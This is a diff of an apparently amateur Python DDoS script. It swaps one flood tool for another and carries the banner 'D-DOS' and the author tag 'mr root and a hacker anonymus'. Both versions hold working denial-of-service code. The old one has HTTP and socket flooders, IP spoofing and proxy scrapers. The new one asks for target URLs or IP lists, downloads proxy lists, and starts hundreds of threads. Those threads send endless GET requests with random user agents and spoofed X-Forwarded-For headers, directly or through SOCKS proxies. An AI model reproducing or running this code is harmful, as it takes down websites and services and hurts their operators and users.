@@ -12,7 +12,7 @@ import time
 import socket
 import os
 import sys
-
+import socket, time, threading, random, re, urllib.request ,os, sys, asyncio
 os.system("clear")
 
 print("""
@@ -25,326 +25,301 @@ print("""
   ADDED NEW METHOD AND BYPASS 
 """)
 
-# def
-url = input(" Ссылка URL : => ")
-thread = int(input(" Time : => "))
-
-
-def atk_1():
-    while True:
-        r = requests.get(url, data="158.69.121.40:7777,158.69.121.40:7777,37.120.192.154:8080")
-        print(r.status_code, "| Attack Sucess |")
-
-
-executor = ThreadPoolExecutor(max_workers=int(1000000000000))
-
-
-def attack():
-    while True:
-
-        a = socket(AF_INET, SOCK_STREAM)
-        for _ in range(100):
-
-            for _ in range(100):
-                a.send(
-                    str.encode(
-                        f"HEAD {url} HTTP/2.0\r\nHost:  {str(randint(1,255))}.{str(randint(1,255))}.{str(randint(1,255))}.{str(randint(1,255))}\r\n\r\n\r\n"
-                    ))
-
-
-def send2attack():
-    for _ in range(2):
-        for _ in range(500):
-            executor.submit(attack)
-    sleep(3)
-
-
-def opth():
-    for a in range(thr):
-        x = threading.Thread(target=atk_1)
-        x.start()
-        print("Threads Running : " + str(a + 1))
-    print("[!] Wait For Ready Threads...")
-    time.sleep(20)
-    input("[+] PRESS [ ENTER ] START ATTACK")
-    global oo
-    oo = True
-
-
-oo = False
-
-
-def main():
-    global url
-    global list
-    global pprr
-    global thr
-    global per
-    
-    thr = int(input(f"[+] Threads (1-1000) : => "))
-    per = int(input("[!] Req Power (1-100) : => "))
-    opth()
-
-
-def atk():
-    pprr = open(list).readlines()
-    proxy = random.choice(pprr).strip().split(":")
-    s = cfscrape.create_scraper()
-    s.proxies = {}
-    s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
-    s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
-    time.sleep(10)
-    while True:
-        while oo:
+# check modules
+_aouthor_ = 'mr root and a hacker anonymus'
+_version_ = 'max'
+_id_ = '@THEserver'
+try:
+    import pyuseragents
+except ModuleNotFoundError:
+    os.system('pip install pyuseragents')
+    import pyuseragents
+try:
+    import pyfiglet
+except ModuleNotFoundError:
+    os.system('pip install pyfiglet')
+    import pyfiglet
+try:
+    os.system('clear')
+except:
+    os.system('cls')
+logo = ['D-DOS']
+banner = (random.choice(logo))
+bnr = pyfiglet.figlet_format(banner)
+print('\033[92m')
+for bnrs in bnr:
+    print(bnrs , flush = True , end = '')
+    time.sleep(0.01)
+print('\n\033[95m')
+try:
+    os.system('date')
+except:
+    pass
+time.sleep(1)
+while 1:
+    useragents : list = [pyuseragents.random(), pyuseragents.random()]
+    async def starturl():
+        global url
+        global url2
+        global urlport
+        global choice1
+        global ips
+        choice1 = input("\n\033[31m[?] \033[36mmethods \033[20;37m:>\n\n\033[31m[+] \033[36mmore target \033[20;37m> \033[31m[\033[92m1\033[31m]\n\033[31m[+] \033[36mone target \033[20;37m> \033[31m [\033[92m2\033[31m]\n\n\033[31m\t[#] \033[36mtype number method \033[31m_> \033[0m")
+        if choice1 == "1":
+            ip_file = input("\n\033[31m[?] \033[36menter txt file of ips or urls \033[31m_> \033[0m")
+            ips = open(ip_file).readlines()
+        else:
+            url = input("\n\033[31m[?] \033[36menter \033[31m[Ссылка URL] \033[36m or \033[31m[IP] \033[36mtarget \033[31m_> \033[20;37m").strip()
+            if url == "":
+                print ("\n\033[31m[!]\t\033[35mplease enter the url or ip.\n")
+                starturl()
             try:
-                s.get(url)
-                print('PROXY ' + str(proxy[0]) + ":" + str(proxy[1]) +
-                      ' Attack ' + str(url))
+                if url[0]+url[1]+url[2]+url[3] == "www.":
+                    url = "http://" + url
+                elif url[0]+url[1]+url[2]+url[3] == "http":
+                    pass
+                else:
+                    url = "http://" + url
+            except:
+                print("\n\033[31m[!] \033[35myou mistyped, try again.\n")
+                starturl()
+            try:
+                url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
+            except:
+                url2 = url.replace("http://", "").replace("https://", "").split("/")[0]
+
+            try:
+                urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
+            except:
+                urlport = "80"
+        proxymode()
+    def proxymode():
+        global choice2
+        choice2 = input("\n\033[31m[?] \033[36muse \033[31m[proxy list] \033[20;37m[y/n] \033[36m_> \033[0m")
+        if choice2 == "y".lower():
+            choiceproxysocks()
+        else:
+            numthreads()
+    def choiceproxysocks():
+        global choice3
+        choice3 = input("\n\033[31m[?] \033[36mtype \033[31m'1' \033[36mfor [socket] proxy \033[20;37m| \033[36mtype \033[31m'2'\033[36m for [socks] proxy \033[31m_> \033[0m")
+        if choice3 == "1":
+            choicedownproxy()
+        elif choice3 == "2":
+            choicedownsocks()
+        else:
+            print ("\n\033[31m[!] \033[35myou mistyped, try again.\n")
+            choiceproxysocks()
+    def choicedownproxy():
+        choice4 = input("\n\033[31m[+] \033[36mdownload proxy list \033[20;37m[y/n] \033[31m_> \033[0m")
+        if choice4 == "y".lower():
+            urlproxy = "https://raw.githubusercontent.com/MynameIsDoit/ddos/main/proxy.txt"
+            proxyget(urlproxy)
+        else:
+            proxylist()
+    def choicedownsocks():
+        choice4 = input("\n\033[31m[+] \033[36mdownload proxy list \033[20;37m[y/n] \033[31m_> \033[0m")
+        if choice4 == "y".lower():
+            urlproxy = "https://www.socks-proxy.net/"
+            proxyget(urlproxy)
+        else:
+            proxylist()
+    def proxyget(urlproxy):
+        try:
+            req = urllib.request.Request(("%s") % (urlproxy))
+            req.add_header("User-Agent", random.choice(useragents))
+            sourcecode = urllib.request.urlopen(req)
+            part = str(sourcecode.read())
+            part = part.split("<tbody>")
+            part = part[1].split("</tbody>")
+            part = part[0].split("<tr><td>")
+            proxies = ""
+            for proxy in part:
+                proxy = proxy.split("</td><td>")
                 try:
-                    for g in range(per):
-                        s.get(url)
-                        print('PROXY ' + str(proxy[0]) + ":" + str(proxy[1]) +
-                              ' Attack ' + str(url))
-                        Thread(target=atk).start()
-                    #s.close()
+                    proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
+                except:
+                    pass
+            out_file = open("proxy.txt","w")
+            out_file.write("")
+            out_file.write(proxies)
+            out_file.close()
+            print ("\n\033[31m[*] \033[36mproxies list downloaded successfully and saved in \033[31m[proxy.txt]\n")
+        except:
+            print ("\n\033[31m[!] error\n")
+        proxylist()
+    def proxylist():
+        global proxies
+        out_file = str(input("\n\033[31m[?] \033[36menter the proxylist \033[31m[ directory/file ] \033[36m[proxy.txt] \033[31m_> \033[0m"))
+        if out_file == "":
+            print('\n\033[31m[!] \033[35mplease enter your file proxy.\n')
+            proxylist()
+        try:
+            proxies = open(out_file, 'r').read().split()
+        except:
+            while True:
+                try:
+                    print(f'\n\033[31m[!] \033[35m[{out_file}] \033[95mnot found!, please enter your file proxy.\n')
+                    out_file = str(input("\n\033[31m[?] \033[36menter the proxylist \033[31m[ directory/file ] \033[36m[proxy.txt] \033[31m_> \033[0m"))
+                    proxies = open(out_file, 'r').read().split()
+                    break
+                except:
+                    pass
+        proxies = open(out_file, 'r').read().split()
+        numthreads()
+    def numthreads():
+        global threads
+        try:
+            threads = int(input("\n\033[31m[?]\033[36menter number of threads \033[20;37m[800] \033[31m_> \033[0m"))
+        except ValueError:
+            threads = 800
+            print ("\n\033[31m[*] \033[35m[800] threads selected.\n")
+        multiplication()
+    def multiplication():
+        global multiple
+        try:
+            multiple = int(input("\n\033[31m[?] \033[36menter a number of multiplication for the attack \033[20;37m[(1-5=normal)(50=powerful)(100 or more=bomb)] \033[31m_> \033[0m"))
+        except ValueError:
+            multiple = int(100)
+        begin()
+    def begin():
+        loop()
+    def loop():
+        global threads
+        global acceptall
+        global connection
+        global go
+        global x     
+        acceptall = [
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
+        "Accept-Encoding: gzip, deflate\r\n", 
+        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
+        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
+        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+        "Accept: text/html, application/xhtml+xml",
+        "Accept-Language: en-US,en;q=0.5\r\n",
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
+        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+        ]
+        connection = "Connection: Keep-Alive\r\n"
+        x = 0
+        go = threading.Event()
+        if choice2 == "y".lower():
+            if choice3 == "1":
+                for x in range(threads):
+                    RequestProxyHTTP(x+1).start()
+                    print ("\n\033[31m[*] \033[93mthread \033[31m" + str(x) + "\033[36m ready")
+                go.set()
+            else:
+                for x in range(threads):
+                    RequestSocksHTTP(x+1).start()
+                    print ("\n\033[31m[*] \033[93mthread \033[31m" + str(x) + "\033[36m ready")
+                go.set()
+        else:
+            for x in range(threads):
+                RequestDefaultHTTP(x+1).start()
+                print ("\n\033[31m[*] \033[93mthread \033[31m" + str(x) + "\033[36m ready")
+            go.set()
+    class RequestProxyHTTP(threading.Thread):
+        def __init__(self, counter):
+            threading.Thread.__init__(self)
+            self.counter = counter
+        def run(self):
+            useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+            accept = random.choice(acceptall)
+            randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
+            forward = "X-Forwarded-For: " + randomip + "\r\n"
+            if choice1 == "1":
+                ip = random.choice(ips)
+                get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+            else:
+                get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
+            request = get_host + useragent + accept + forward + connection + "\r\n" # ecco la final request
+            current = x
+            if current < len(proxies):
+                proxy = proxies[current].strip().split(':')
+            else:
+                proxy = random.choice(proxies).strip().split(":")
+            go.wait()
+            while True:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((str(proxy[0]), int(proxy[1])))
+                    s.send(str.encode(request))
+                    print ("\n\033[31m[+] \033[92mrequests sent \033[31m=> \033[20;37m" + str(proxy[0]+":"+proxy[1]) + "\033[31m @\033[92m", self.counter) # print delle richieste
+                    try:
+                        for y in range(multiple):
+                            s.send(str.encode(request))
+                    except:
+                        s.close()
+                except:
+                    s.close()
+    class RequestSocksHTTP(threading.Thread):
+        def __init__(self, counter):
+            threading.Thread.__init__(self)
+            self.counter = counter
+        def run(self):
+            useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+            accept = random.choice(acceptall)
+            if choice1 == "1":
+                ip = random.choice(ips)
+                get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+            else:
+                get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
+            request = get_host + useragent + accept + connection + "\r\n"
+            current = x
+            if current < len(proxies):
+                proxy = proxies[current].strip().split(':')
+            else:
+                proxy = random.choice(proxies).strip().split(":")
+            go.wait()
+            try:
+                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
+                s = socks.socksocket()
+                s.connect((str(url2), int(urlport)))
+                s.send (str.encode(request))
+                print ("\033[31m[!] \033[92mrequest sent \033[31m=> \033[20;37m" + str(proxy[0]+":"+proxy[1]) + "\033[31m @\033[20;37m", self.counter)
+                try:
+                    for y in range(multiple):
+                        s.send(str.encode(request))
                 except:
                     s.close()
             except:
+                print ("\n\033[31m[!]\t\033[35msock down retrying request \033[31m@\033[20;37m", self.counter)
                 s.close()
-                print("Proxy is not response..")
-
-
-if __name__ == "__main__":
-    main()
-
-
-
-l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB"]
-l4 = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP"]
-l3 = ["POD", "ICMP"]
-to = ["CFIP", "DNS", "PING", "CHECK", "DSTAT", "INFO"]
-ot = ["STOP", "TOOLS", "HELP"]
-methods = l7 + l4 + l3
-methodsl = l7 + l4 + l3 + to + ot
-
-
-
-def spoofer():
-    addr = [192, 168, 0, 1]
-    d = '.'
-    addr[0] = str(random.randrange(11, 197))
-    addr[1] = str(random.randrange(0, 255))
-    addr[2] = str(random.randrange(0, 255))
-    addr[3] = str(random.randrange(2, 254))
-    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
-    return assemebled
-
-
-def UrlFixer(original_url):
-    global target, path, port, protocol
-    original_url = original_url.strip()
-    url = ""
-    path = "/"
-    port = 80
-    protocol = "http"
-    if original_url[:7] == "http://":
-        url = original_url[7:]
-    elif original_url[:8] == "https://":
-        url = original_url[8:]
-        protocol = "https"
-    tmp = url.split("/")
-    website = tmp[0]
-    check = website.split(":")
-    if len(check) != 1:
-        port = int(check[1])
-    else:
-        if protocol == "https":
-            port = 443
-    target = check[0]
-    if len(tmp) > 1:
-        path = url.replace(website, "", 1)
-
-
-
-def head(event, socks_type):
-    proxy = (random).strip().split(":")
-    header = head("head")
-    head_host = "HEAD " + path + "?" + random() + " HTTP/1.1\r\nHost: " + target + "\r\n"
-    request = head_host + header
-    event.wait()
-    while time.time() < Timer:
-        try:
-            s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-            if socks_type == 5:
-                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
-                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.connect((str(target), int(port)))
-            
-            try:
-                for _ in range(threading):
-                    s.send(str.encode(request))
-            except:
-                s.close()
-        except:
-            s.close()
-
-
-def downloadsocks(choice):
-    global out_file
-    if choice == "4":
-        f = open( target, 'wb')
-        try:
-            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
-                             timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4", timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get("https://www.proxyscan.io/download?type=socks4", timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get(
-                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=socks4&lastchecked=60",
-                timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", timeout=5)
-            f.write(r.content)
-            f.close()
-        except:
-            f.close()
-        
-
-
-
-url=''                                                                                              
-host=''                                                                                             
-headers_useragents=[]                                                                               
-headers_referers=[]                                                                                 
-request_counter=0                                                                                   
-flag=0                                                                                             
-safe=0                                                                                              
-
-def inc_counter():
-	global request_counter
-	request_counter+=45
-
-def set_flag(val):
-	global flag
-	flag=val
-
-def set_safe():
-	global safe
-	safe=1
-	
-#pp py
-def useragent_list():
-	global headers_useragents
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
-	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-	return(headers_useragents)
-
-#pp botnet 
-
-def referer_list():
-	global headers_referers
-	headers_referers.append('http://www.google.com/?q=')                                       
-	headers_referers.append('http://www.usatoday.com/search/results?q=')                       
-	headers_referers.append('http://engadget.search.aol.com/search?q=')                        
-	headers_referers.append('http://www.google.com/?q=')                                      
-	headers_referers.append('http://www.usatoday.com/search/results?q=')                       
-	headers_referers.append('http://engadget.search.aol.com/search?q=')                        
-	headers_referers.append('http://www.bing.com/search?q=')                                  
-	headers_referers.append('http://search.yahoo.com/search?p=')                              
-	headers_referers.append('http://www.ask.com/web?q=')
-	headers_referers.append('http://search.lycos.com/web/?q=')
-	headers_referers.append('http://busca.uol.com.br/web/?q=')
-	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
-	headers_referers.append('http://www.dmoz.org/search/search?q=')
-	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
-	headers_referers.append('http://yandex.ru/yandsearch?text=')
-	headers_referers.append('http://www.zhongsou.com/third?w=')
-	headers_referers.append('http://hksearch.timway.com/search.php?query=')
-	headers_referers.append('http://find.ezilon.com/search.php?q=')
-	headers_referers.append('http://www.sogou.com/web?query=')
-	headers_referers.append('http://api.duckduckgo.com/html/?q=')
-	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
-	headers_referers.append('http://www.rssboard.org/rss-validator/check.cgi?url=')
-	headers_referers.append('http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=')
-	headers_referers.append('http://prodvigator.bg/redirect.php?url=')
-	headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
-	headers_referers.append('http://www.ccm.edu/redirect/goto.asp?myURL=')
-	headers_referers.append('http://forum.buffed.de/redirect.php?url=')
-	headers_referers.append('http://rissa.kommune.no/engine/redirect.php?url=')
-	headers_referers.append('http://www.sadsong.net/redirect.php?url=')
-	headers_referers.append('https://www.fvsbank.com/redirect.php?url=')
-	headers_referers.append('http://www.jerrywho.de/?s=/redirect.php?url=')
-	headers_referers.append('http://www.inow.co.nz/redirect.php?url=')
-	headers_referers.append('http://www.automation-drive.com/redirect.php?url=')
-	headers_referers.append('http://mytinyfile.com/redirect.php?url=')
-	headers_referers.append('http://ruforum.mt5.com/redirect.php?url=')
-	headers_referers.append('http://www.websiteperformance.info/redirect.php?url=')
-	headers_referers.append('http://www.airberlin.com/site/redirect.php?url=')
-	headers_referers.append('http://www.rpz-ekhn.de/mail2date/ServiceCenter/redirect.php?url=')
-	headers_referers.append('http://evoec.com/review/redirect.php?url=')
-	headers_referers.append('http://www.crystalxp.net/redirect.php?url=')
-	headers_referers.append('http://watchmovies.cba.pl/articles/includes/redirect.php?url=')
-	headers_referers.append('http://www.seowizard.ir/redirect.php?url=')
-	headers_referers.append('http://apke.ru/redirect.php?url=')
-	headers_referers.append('http://seodrum.com/redirect.php?url=')
-	headers_referers.append('http://redrool.com/redirect.php?url=')
-	headers_referers.append('http://blog.eduzones.com/redirect.php?url=')
-	headers_referers.append('http://www.onlineseoreportcard.com/redirect.php?url=')
-	headers_referers.append('http://www.wickedfire.com/redirect.php?url=')
-	headers_referers.append('http://searchtoday.info/redirect.php?url=')
-	headers_referers.append('http://www.bobsoccer.ru/redirect.php?url=')
-	headers_referers.append('http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=')
-	headers_referers.append('http://seo.qalebfa.ir/%D8%B3%D8%A6%D9%88%DA%A9%D8%A7%D8%B1/redirect.php?url=')
-	headers_referers.append('http://www.firmia.cz/redirect.php?url=')
-	headers_referers.append('http://www.e39-forum.de/redir.php?url=')
-	headers_referers.append('http://www.wopus.org/wp-content/themes/begin/inc/go.php?url=')
-	headers_referers.append('http://www.selectsmart.com/plus/select.php?url=')
-	headers_referers.append('http://www.taichinh2a.com/forum/links.php?url=')
-	headers_referers.append('http://facenama.com/go.php?url=')
-	headers_referers.append('http://www.internet-abc.de/eltern/118732.php?url=')
-	headers_referers.append('http://g.makebd.com/index.php?url=')
-	headers_referers.append('https://blog.eduzones.com/redirect.php?url=')
-	headers_referers.append('http://www.mientay24h.vn/redirector.php?url=')
-	headers_referers.append('http://www.kapook.com/webout.php?url=')
-	headers_referers.append('http://lue4.ddns.name/pk/index.php?url=')
-	headers_referers.append('http://747.ddns.ms/pk/index.php?url=')
-	headers_referers.append('http://737.ddns.us/pk/index.php?url=')
-	headers_referers.append('http://a30.m1.4irc.com/pk/index.php?url=')
-
-
-
-
-
-
-
-
-for i in range(thread):
-    threading.Thread(target=atk_1).start()
+    class RequestDefaultHTTP(threading.Thread):
+        def __init__(self, counter):
+            threading.Thread.__init__(self)
+            self.counter = counter
+        def run(self):
+            useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+            accept = random.choice(acceptall)
+            if choice1 == "1":
+                ip = random.choice(ips)
+                get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+            else:
+                get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
+            request = get_host + useragent + accept + connection + "\r\n"
+            go.wait()
+            while True:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((str(url2), int(urlport)))
+                    s.send (str.encode(request))
+                    print ("\n\033[31m[+] \033[92mrequests sent \033[31m=> \033[20;37m", self.counter)
+                    try:
+                        for y in range(multiple):
+                            s.send(str.encode(request))
+                    except:
+                        s.close()
+                except:
+                    s.close()
+    if __name__ == '__main__':
+        asyncio.run(starturl())
+#....................................[end]...................................
